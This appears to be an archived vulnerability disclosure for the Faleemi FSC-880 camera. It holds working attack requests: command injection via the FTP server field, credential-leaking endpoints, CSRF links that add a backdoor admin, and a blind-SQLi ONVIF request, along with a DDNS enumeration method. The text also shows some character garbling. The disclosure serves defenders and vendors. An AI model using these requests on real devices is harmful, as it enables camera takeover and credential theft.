@@ -1,0 +1,208 @@
+id: 28680
+date: 09/29/2017
+title: Faleemi FSC-880 CSRF / SQL Injection / Command Execution Vulnerabilities
+author: Oleg Puzanov
+cves: CVE-2017-14743
+
+Full disclosure is here: https://medium.com/iotsploit/faleemi-fsc-880-multiple-security-vulnerabilities-ed1d132c2cce <https://medium.com/iotsploit/faleemi-fsc-880-multiple-security-vulnerabilities-ed1d132c2cce>
+
+===
+
+Timeline:
+
+    25 August 2017: the research was made
+    29 August 2017: an email was sent to the vendor, but with no answer
+    25 September 2017: public disclosure
+    26 September 2017: assigned CVE-2017a14743
+
+https://www.faleemi.com/product/fsc880-1080p-wirelee-ip-camera/
+
+Firmware: 00.01.01.0048P2 (2017-07-27)
+
+This camera has multiple security vulnerabilities, which can be exploited both locally and remotely. In particular, hardwired manufacturer DDNS and port-mapping to camera via upnp compatible router. Allowing for the discovered avoidance of authentication and RCE, this camera is an ideal candidate for another botnet such as Mirai.
+
+
+CVE-2017a14743
+
+Vulnerabilities
+
+RCE
+
+Works in stock firmware 00.01.01.0046 (E2017a03-**)
+
+In the latest firmware (00.01.01.0048P2 (2017a07a27)) this is fixedaaaftp client is removed. It is not in processes and in file systemaaaostensibly because realization was altered.
+
+Remote code execution in admin panel in GET parameters of Ft server scenario
+
+http://IP/hy-cgi/ftp.cgi?cmd=setftpattr&ft_server=;RCE;&ftp_port==25&ft_username=&ft_password=&ft_dirname=
+
+RCE2 (LAN)
+
+During analysis and reversing of the firmware we found and undocumented functionaaait is possible to quite simply turn on telnet on the device:
+
+Turn on telnet on port 23
+http://192.168.0.100/hy-cgi/factory_param.cgi?cmd=settelnetstatus&enable=1
+
+Check status
+http://192.168.0.100/hy-cgi/factory_param.cgi?cmd=gettelnetstatus
+
+Password protected Telnetaaasame as on web panel but with one exception: telnet is not connected to upnp. This suggests that port is not accessible outside LAN.
+
+We have so far been unable to connect it because we have not found custom settings of doing so to upnp.
+
+enable upnp:
+http://192.168.0.100/hy-cgi/net.cgi?cmd=setupnpattr&upnp_enable=1
+
+upnp status:
+http://192.168.0.100/hy-cgi/net.cgi?cmd=getupnpattr&cmd=getupnpmap&cmd=getupnptmstatus
+Plaintext passwords
+
+User passwords are stored on the device in plaintext format in several locations simultaneously:
+
+/etc/webserver/lighttpd.user
+/mnt/mtd/db/ipcsys.db
+
+Passwords are synchronised when changed.
+Information Disclosure
+
+Prior 00.01.01.0048P2 (2017a07a27)aaa0DAY
+
+Device Info:
+http://192.168.0.100/hy-cgi/device.cgi?cmd=getdeviceinfo
+
+WIFI credentials leak:
+http://192.168.0.100/hy-cgi/wifi.cgi?cmd=getwifiattr
+
+Current user credentials leak:
+http://192.168.0.100/hy-cgi/user.cgi?cmd=checkuserinfo
+
+All users credentials leak:
+http://192.168.0.100/hy-cgi/user.cgi?cmd=getuserattr
+
+Third Party DDNS credentials leak:
+http://192.168.0.100/hy-cgi/ddns.cgi?cmd=get3thddnsattr
+
+Manufactureras DDNS credentials leak:
+http://192.168.0.100/hy-cgi/factory_param.cgi?cmd=getddns
+
+SMTP settings and credentials leak:
+http://192.168.0.100/hy-cgi/smtp.cgi?cmd=getsmtpattr
+
+FTP settings and credentials leak:
+http://192.168.0.100/hy-cgi/ftp.cgi?cmd=getftpattr
+
+CSRF
+
+Prior 00.01.01.0048P2 (2017a07a27)aaa0DAY
+
+http://192.168.8.102/hy-cgi/device.cgi?cmd=sysreboot
+http://192.168.0.100/hy-cgi/log.cgi?cmd=deloperlog
+http://192.168.0.100/hy-cgi/log.cgi?cmd=cleanlog
+http://192.168.0.100/hy-cgi/user.cgi?cmd=adduser&at_username=BACKDOOR_ADMIN&at_password=BACKDOOR_PASSWORD&at_rolename=admin
+
+All changes in camera settings go through GET commands and donat use CSRF tokens.
+
+The following functions can be executed remotely:
+
+    Configure Camera
+    Format SD card
+    Delete Logs
+    Steal image from camera
+
+These actions and commands can be executed from admin browser. The indecent hacker only needs to lure the admin to their page.
+
+Similar attacks on routers have been registered in the past: http://malware.dontneedcoffee.com/2015/05/an-exploit-kit-dedicated-to-csrf.html
+
+And some more epic stuff
+Manufactureras DDNS enumeration
+
+There are hardwired DDNS manufacturer settings found in the device. The device sends an http request using udp www.nwsvr1.com, and sends its internal address and admin web panel IP address to API http://www.nwsvr1.com/api/userip.asp
+
+The device we researched has DDNS name 009lfld.nwsvr1.com. Knowing that device names are generated automatically, it is possible to enumerate the entire range of names using a mask 00\d[a-z]{4}.nwsvr1.com and obtain a full list of devices in the network.
+
+We found a total of 758000 devices, which connected with this DDNS at least once in the past.
+
+These are cameras by different manufacturers, that are somehow related to each other.
+
+Around 3% of devices are in the network..
+HK 18.41%
+US 12.72%
+DE 9.94%
+ES 6.77%
+FR 5.66%
+AR 5.09%
+GB 5.00%
+DK 3.79%
+IT 3.34%
+PL 3.04%
+MX 1.90%
+CN 1.55%
+VN 1.53%
+JP 1.53%
+HU 1.40%
+CL 1.27%
+BR 1.20%
+TH 1.19%
+
+A little over 20% of all devices use a default password. Virtually all devices are accessible by ONVIF
+
+A similar number (20a25 thousands devices are online) are vulnerable to auth bypass via sqli.
+
+We have serious concerns that the DDNs password, which is hardwired into the device by the manufacturer is incremental. This means that it is possible to reverse-calculate the password to the camera based on its DDNS name.
+
+This raises the risk of the password being hijacked if the IP cards are switched on DDNS server, then redirected the admin using a camera with a DDNS name and grabs the password using his own authentication form.
+
+Authorization bypass via blind SQLi
+
+Prior 00.01.01.0048P2 (2017a07a27)aaa0DAY
+
+A device without authentication on web-port has an accessible endpoint by default /onvif/
+
+ONVIF is an API standard for such devices. WSDL can be downloaded from the official website (www.onvif.org).
+
+API uses authentication by tokens.
+
+This device also has an SQL injection vulnerability in the username field of the authentication token. Using this it is possible to obtain an admin password.
+
+Example of the exploit:
+
+
+/* https://medium.com/iotsploit/faleemi-fsc-880-multiple-security-vulnerabilities-ed1d132c2cce */
+
+POST /onvif/device_service HTTP/1.1
+Content-Type: application/soap+xml
+Content-Length: 1076
+charset: utf-8
+Host: 192.168.0.100
+Connection: close
+
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
+<s:Header>
+<Security s:mustUnderstand="1" xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
+<UsernameToken>
+<Username>adfgadfhart' AND 1=2 UNION SELECT 1,'admin',(select unicode(substr(C_PassWord, 2, 1)) from t_user limit 1 OFF
+SET 0),'remark'/*</Username>
+<Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">UHZj
+ybNG8udkMEflf+LjkCUmR88=</Password>
+<Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">fD
+nW+mqvvsID/WJGNR6QWQ==</Nonce>
+<Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">1970-01-01T00:03:58
+.674Z</Created>
+</UsernameToken>
+</Security>
+</s:Header>
+<s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+<GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/>
+</s:Body>
+</s:Envelope>
+
+
+To do this, the date and time set in the device are needed because they are used to build the password field of the authentication token.
+
+We drafted this POC, which allows to extract from the camera a password and gain entry to the device using admin credentials.
+
+This research was made by IoTSploit Team. Feel free to contact us at oleg@iotsploit.co and visit our website at https://iotsploit.co/
+
+If you have any active contact with Faleemi, please, show them this report and we are ready to coop.
+
+#  0day.today [2023-03-24]  #
